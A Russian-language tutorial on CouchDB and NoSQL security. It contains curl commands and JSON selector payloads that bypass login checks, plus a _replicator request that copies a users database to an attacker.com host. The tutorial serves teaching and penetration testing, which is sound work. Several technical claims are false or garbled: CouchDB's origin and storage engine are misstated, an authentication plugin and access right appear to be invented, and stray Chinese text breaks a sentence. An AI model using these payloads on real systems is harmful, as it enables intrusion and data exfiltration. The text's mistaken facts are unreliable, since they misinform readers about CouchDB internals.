# Уязвимости CouchDB и других NoSQL-баз данных

## Контекст и базовые понятия: Эволюция NoSQL и специфика CouchDB

NoSQL (Not Only SQL) — это обобщающий термин для классов систем управления базами данных (СУБД), которые не опираются на табличную реляционную модель и язык SQL в качестве основного интерфейса взаимодействия. Термин возник в конце 1990-х годов для обозначения легковесных, распределенных баз данных, не требующих сложного управления транзакциями и схемами, характерными для RDBMS (Relational Database Management Systems). В современном контексте NoSQL классифицируется по модели хранения данных: документные (MongoDB, CouchDB), ключ-значение (Redis, DynamoDB), графовые (Neo4j) и колоночные (Cassandra, HBase).

CouchDB, разработанный компанией Apache (ранее Cloudant), занимает уникальную нишу среди документных баз данных. В отличие от MongoDB, которая использует собственный бинарный протокол BSON и API, CouchDB реализует принципы RESTful-архитектуры. Данные в CouchDB хранятся в виде JSON-документов, а взаимодействие с СУБД происходит исключительно через HTTP-запросы (GET, PUT, POST, DELETE). Это делает CouchDB естественным выбором для веб-приложений, но также формирует специфический вектор атак, связанный с логикой HTTP-протокола и особенностями реализации движка Mongoose (движок хранения CouchDB).

Ключевое разграничение между CouchDB и другими NoSQL-систрами (в частности, MongoDB) заключается в механизме репликации и консистентности. CouchDB использует протокол Multi-Master Replication, где каждый узел кластера является мастером и может принимать записи. Это порождает специфические уязвимости, связанные с конфликтами версий (conflicts) и безопасностью репликации. MongoDB, напротив, исторически полагалась на модель Master-Slave (или Replica Sets с选举 лидера), что смещает вектор атак на узел лидера или на несекьюрные интерфейсы администрирования.

Для понимания специфики атак необходимо четко разграничить понятия «NoSQL Injection» и «SQL Injection». SQL-инъекция эксплуатирует уязвимость в парсере SQL-запросов, позволяя злоумышленнику вмешаться в логику выполнения запроса к реляционной БД. NoSQL-инъекция эксплуатирует уязвимость в парсере или валидаторе данных на уровне приложения, которое формирует запрос к NoSQL-БД, передавая некорректные данные (часто в формате JSON или объектов JavaScript), которые интерпретируются движком базы данных как часть запроса, а не как данные.

| Характеристика | CouchDB | MongoDB | Redis |
| :--- | :--- | :--- | :--- |
| **Модель данных** | Документная (JSON) | Документная (BSON) | Ключ-значение (различные типы) |
| **Интерфейс** | REST API (HTTP/HTTPS) | Собственный протокол (TCP) | Протокол Redis (TCP) |
| **Язык запросов** | CouchDB Views (MapReduce) / Mango Query | MongoDB Query Language | Команды Redis (GET, SET, HGETALL и др.) |
| **Репликация** | Multi-Master (активно-активная) | Replica Sets (активно-пассивная) | Master-Slave (синхронная/асинхронная) |
| **Типичная векторная атака** | NoSQL Injection в Mango Query, Misconfiguration | NoSQL Injection в `$where`/`$gt`, Auth Bypass | Auth Bypass (default config), SSRF через Redis |
| **Хранение** | Файловая система (B-tree индексы) | WiredTiger / MMAPv1 | In-Memory (с дампом на диск) |

Путаница в терминологии часто возникает из-за того, что современные RDBMS (например, PostgreSQL) начали поддерживать JSON-поля, а NoSQL-базы (MongoDB 4.0+) добавили поддержку транзакций ACID. Однако с точки зрения информационной безопасности архитектура обработки запросов остается фундаментально различной. CouchDB, будучи HTTP-first СУБД, требует особого внимания к заголовкам HTTP, методам аутентификации (Cookie, Basic Auth, Cookie-based) и CORS-политикам, которые в MongoDB отсутствуют как базовые элементы интерфейса.

## Внутреннее устройство: Архитектура CouchDB и механизмы NoSQL-инъекций

CouchDB состоит из нескольких ключевых компонентов: HTTP-сервера (Chttpd), движка хранения (Mango/Query Engine), менеджера репликации (Replicator) и системы управления правами доступа (Security Document). Понимание внутреннего устройства критично для выявления уязвимостей.

### Архитектура и обработка запросов в CouchDB

При получении HTTP-запроса (например, `POST /mydb/_find`) сервер Chttpd парсит тело запроса. Если запрос направлен к `_find`, он передается в Mango Query Engine. Mango принимает JSON-объект с полями `selector`, `fields`, `sort`, `limit`. Уязвимость возникает, если приложение передает пользовательский ввод непосредственно в поле `selector` без должной валидации типов. В отличие от SQL, где инъекция требует специфических синтаксических конструкций (`' OR 1=1--`), в NoSQL инъекция часто заключается в передаче структурных данных, которые меняют логику сравнения.

Пример структуры запроса к `_find`:
```json
{
  "selector": {
    "username": { "$eq": "admin" },
    "password": { "$gt": "" }
  }
}
```
Здесь `$gt` (greater than) используется для обхода проверки пароля, если пароль хранится как строка. Если злоумышленник может контролировать значение `username` или `password` в селекторе, он может изменить оператор сравнения.

### Механизм NoSQL-инъекций

NoSQL-инъекции делятся на несколько типов в зависимости от целевой СУБД и способа эксплуатации:

1.  **Обход аутентификации (Authentication Bypass):**
    Используется оператор `$gt` (больше) или `$ne` (не равно). Если приложение проверяет наличие пользователя с заданным паролем, передавая данные в формате JSON, инъекция может заставить базу данных игнорировать поле пароля или возвращать первого попавшегося пользователя.
    *   *Механизм:* `{"username": "admin", "password": {"$gt": ""}}`
    *   *Результат:* Если пароль не пустой, `"" < password` истинно для большинства строк. База возвращает пользователя.

2.  **Извлечение данных (Data Extraction):**
    Использование операторов `$regex` (регулярные выражения) или `$where` (JavaScript-выражения).
    *   *Механизм:* `{"username": {"$regex": "^a"}}`
    *   *Результат:* Возвращает всех пользователей, имя которых начинается на 'a'.
    *   *Опасность:* `$where` позволяет выполнять произвольный JavaScript-код на стороне сервера (если движок поддерживает это, как в старых версиях MongoDB или специфических конфигурациях CouchDB через репликатор или временные документы).

3.  **Инъекция в репликатор (Replicator Injection):**
    CouchDB имеет встроенный механизм репликации `_replicate`. Если злоумышленник может записать документ в базу `_replicator` (что требует прав `db_owner` или `pouchdb`), он может инициировать репликацию данных из целевой базы на злонамеренный сервер.
    *   *Механизм:* Запись документа в `_replicator` с полем `source` и `target`.
    *   *Результат:* Полный дамп базы данных на удаленный сервер атакующего.

4.  **Уязвимости в Mango Query Engine:**
    Mango Query Engine в CouchDB поддерживает сложные селекторы. Уязвимость может возникать при неправильной валидации типов полей. Например, передача массива вместо строки в поле, которое ожидается как строка, может привести к ошибкам парсинга или, в некоторых версиях, к некорректному сравнению типов (type coercion).

### Сравнительный анализ векторов атак на NoSQL

| Тип атаки | CouchDB | MongoDB | Redis | Механизм эксплуатации |
| :--- | :--- | :--- | :--- | :--- |
| **Auth Bypass** | `$gt`, `$ne` в `_find` | `$gt`, `$ne` в `$where` | `CONFIG SET requirepass ""` | Изменение логики сравнения |
| **Data Extraction** | `$regex` в селекторе | `$regex`, `$where` | `KEYS *`, `HGETALL` | Использование wildcards или JS |
| **RCE (Remote Code Exec)** | Через `_replicator` или временные документы | `$where` (JS), `eval` | `CONFIG SET dir`, `dbfilename` | Выполнение кода на сервере |
| **Misconfiguration** | Публичный доступ к `_all_docs` | Публичный порт 27017 | Отсутствие пароля по умолчанию | Отсутствие аутентификации |

В CouchDB особенно опасна уязвимость, связанная с тем, что по умолчанию сервер может быть запущен без аутентификации (если не настроен `couchdb.ini` с секцией `[admins]` или не включен плагин `couchdb_auth`). Кроме того, CouchDB использует Cookie-based аутентификацию, что делает её уязвимой к CSRF (Cross-Site Request Forgery), если не настроены соответствующие заголовки `Origin` или `X-Requested-With`.

## Применение и работа с предметом: Инструментарий и методы тестирования

Тестирование на проникновение NoSQL-баз данных требует специализированных инструментов и понимания синтаксиса запросов конкретной СУБД. Для CouchDB основным вектором является взаимодействие через HTTP-запросы к API `_find`, `_all_docs`, `_changes` и `_replicate`.

### Инструментарий для тестирования CouchDB и NoSQL

1.  **Burp Suite / OWASP ZAP:**
    Используются для перехвата и модификации HTTP-запросов. При тестировании CouchDB важно анализировать тело POST-запросов, отправляемых на эндпоинты `_find` или `_bulk_docs`.
    *   *Действие:* Перехват запроса `POST /db/_find`.
    *   *Модификация:* Изменение поля `selector` для внедрения NoSQL-инъекции.

2.  **NoSQLMap:**
    Автоматизированный инструмент для обнаружения и эксплуатации уязвимостей NoSQL. Поддерживает MongoDB, CouchDB, Redis и другие.
    *   *Функция:* Автоматический обход аутентификации, извлечение данных, проверка на уязвимость репликатора.
    *   *Применение:* `nosqlmap -u "http://target:5984/db/_find" --data="selector={}"`

3.  **Curl / HTTPie:**
    Для ручного тестирования API CouchDB.
    *   *Команда:* Проверка публичности базы данных.
    *   *Пример:* `curl -X GET http://target:5984/_all_dbs`

4.  **PouchDB / Nano (Node.js):**
    Клиентские библиотеки, которые могут быть использованы для создания скриптов автоматизации атак, если приложение использует их на клиентской стороне (что часто приводит к утечке конфигурации).

### Типичные ошибки и подводные камни

1.  **Неверная валидация типов в приложении:**
    Разработчики часто ожидают, что пользователь передаст строку в поле `username`. Если приложение не проверяет тип, а передает значение напрямую в JSON-объект запроса, злоумышленник может передать объект или массив.
    *   *Пример:* `{"username": {"$ne": null}}` вместо `{"username": "admin"}`.

2.  **Отсутствие CORS-политик:**
    CouchDB по умолчанию не включает строгие CORS-заголовки. Если веб-приложение использует CouchDB напрямую с фронтенда, любой сайт может отправлять запросы к CouchDB (если аутентификация отключена или использует Cookie).
    *   *Проверка:* Анализ заголовков `Access-Control-Allow-Origin`.

3.  **Уязвимости репликатора:**
    Если злоумышленник получает права `db_owner`, он может записать документ в `_replicator`. Это не является инъекцией в классическом смысле, но является критической уязвимостью конфигурации и прав доступа.
    *   *Метод:* `POST /_replicator` с документом, содержащим `source` и `target`.

4.  **Использование `_changes` для мониторинга:**
    Эндпоинт `_changes` позволяет получать уведомления об изменениях в базе. Если аутентификация слабая, злоумышленник может подписаться на изменения и отслеживать новые записи в реальном времени.

### Примеры команд и запросов для тестирования

**Проверка на публичный доступ:**
```bash
curl -X GET http://target:5984/_all_dbs
```
*Ожидаемый вывод:* Список всех баз данных, если аутентификация отключена.

**Тест на NoSQL Injection в `_find`:**
```bash
curl -X POST http://target:5984/mydb/_find \
  -H "Content-Type: application/json" \
  -d '{
    "selector": {
      "username": { "$ne": null },
      "password": { "$ne": null }
    },
    "limit": 1
  }'
```
*Ожидаемый вывод:* Возврат первого документа из базы, независимо от учетных данных.

**Тест на уязвимость репликатора:**
```bash
curl -X POST http://target:5984/_replicator \
  -H "Content-Type: application/json" \
  -d '{
    "source": "http://target:5984/mydb",
    "target": "http://attacker.com/evildb",
    "create_target": true
  }'
```
*Ожидаемый вывод:* Статус 200 OK, если права позволяют запись в `_replicator`.

## Сквозной практический пример: Эксплуатация уязвимости аутентификации CouchDB

**Исходные условия:**
*   **Среда:** Локальная установка CouchDB 3.2.1, запущенная в Docker-контейнере с портом 5984.
*   **База данных:** `users_db`, содержащая документы пользователей с полями `username` и `password`.
*   **Приложение:** Веб-приложение, использующее CouchDB для аутентификации. При входе пользователь отправляет POST-запрос на `http://target:5984/users_db/_find` с JSON-телом, содержащим `username` и `password`.
*   **Роль:** Тестировщик на проникновение, имеющий доступ к веб-интерфейсу приложения.
*   **Сценарий:** Обход аутентификации администратора без знания пароля.

**Шаг 1: Анализ легитимного запроса аутентификации**

Перехватываем запрос, отправляемый приложением при попытке входа. Приложение формирует селектор для поиска пользователя с заданным именем и паролем.

```json
{
  "selector": {
    "username": { "$eq": "testuser" },
    "password": { "$eq": "correct_password" }
  },
  "limit": 1
}
```

*Ожидаемый результат:* Возврат документа пользователя `testuser`, если пароль верен.

**Шаг 2: Модификация селектора для обхода проверки пароля**

Злоумышленник модифицирует поле `password` в селекторе, используя оператор `$gt` (больше). Поскольку пароли в CouchDB обычно хранятся как строки, пустая строка `""` будет меньше любой непустой строки. Таким образом, условие `password > ""` будет истинным для любого непустого пароля.

```json
{
  "selector": {
    "username": { "$eq": "admin" },
    "password": { "$gt": "" }
  },
  "limit": 1
}
```

*Ожидаемый результат:* Возврат документа первого пользователя с именем `admin`, у которого пароль не пустой. Если в базе есть пользователь `admin` с любым паролем, аутентификация пройдет успешно.

**Шаг 3: Эксплуатация через оператор `$ne` (не равно)**

Если приложение использует другую логику (например, проверяет, что пароль *не равен* чему-то), можно использовать `$ne`. Однако более надежный метод — игнорировать поле пароля полностью, используя `$exists: true` или просто `$ne: null`.

```json
{
  "selector": {
    "username": { "$eq": "admin" },
    "password": { "$ne": null }
  },
  "limit": 1
}
```

*Ожидаемый результат:* Возврат документа пользователя `admin`, если у него есть поле `password` (даже если оно пустое или null, в зависимости от реализации `$ne`).

**Шаг 4: Проверка на уязвимость репликатора (если аутентификация не сработала)**

Если аутентификация не сработала, проверяем, есть ли возможность записи в `_replicator`. Это требует прав `db_owner` на базу `users_db`. Если такие права есть (например, из-за misconfiguration), можно инициировать репликацию.

```json
{
  "source": "http://target:5984/users_db",
  "target": "http://attacker.com:5984/evil_db",
  "create_target": true
}
```

*Ожидаемый результат:* Если права позволяют, документ будет создан, и CouchDB начнет реплицировать данные `users_db` на сервер атакующего.

**Ожидаемый вывод:**
Пример демонстрирует, как NoSQL-инъекция в поле `selector` позволяет обойти проверку пароля. Использование `$gt: ""` или `$ne: null` изменяет логику запроса так, что база данных возвращает пользователя, игнорируя фактическое значение пароля. Это критическая уязвимость, позволяющая получить несанкционированный доступ к учетной записи администратора.

## Аналитический вывод

Уязвимости CouchDB и других NoSQL-баз данных представляют собой серьезную угрозу, обусловленную архитектурными особенностями этих систем. CouchDB, будучи RESTful-СУБД, расширяет поверхность атаки за счет HTTP-протокола, делая её уязвимой к CSRF и уязвимостям CORS, помимо классических NoSQL-инъекций. Ключевым отличием CouchDB от MongoDB является механизм репликации Multi-Master, который, хотя и обеспечивает высокую доступность, создает векторы атак через уязвимый эндпоинт `_replicator`.

NoSQL-инъекции в CouchDB чаще всего эксплуатируют движок Mango Query Engine, позволяя злоумышленникам изменять логику запросов через поля `selector`. Использование операторов `$gt`, `$ne` и `$regex` позволяет обходить аутентификацию и извлекать данные. В отличие от SQL-инъекций, которые требуют специфических синтаксических конструкций, NoSQL-инъекции часто сводятся к передаче структурных данных (JSON-объектов), которые интерпретируются как часть запроса.

Для защиты от этих уязвимостей необходимо:
1.  Валидировать и санитизировать все пользовательские данные, передаваемые в селекторы запросов.
2.  Использовать строгие CORS-политики и заголовки аутентификации.
3.  Ограничивать права доступа к системным базам `_replicator` и `_users`.
4.  Регулярно обновлять CouchDB до последних версий, где исправлены известные уязвимости в Mango Query Engine.
5.  Использовать аутентификацию на уровне приложения, а не полагаться только на аутентификацию CouchDB.

Понимание внутреннего устройства CouchDB и механизмов NoSQL-инъекций критично для специалистов по информационной безопасности, так как эти уязвимости часто остаются незамеченными при стандартном тестировании на проникновение, ориентированном на RDBMS.
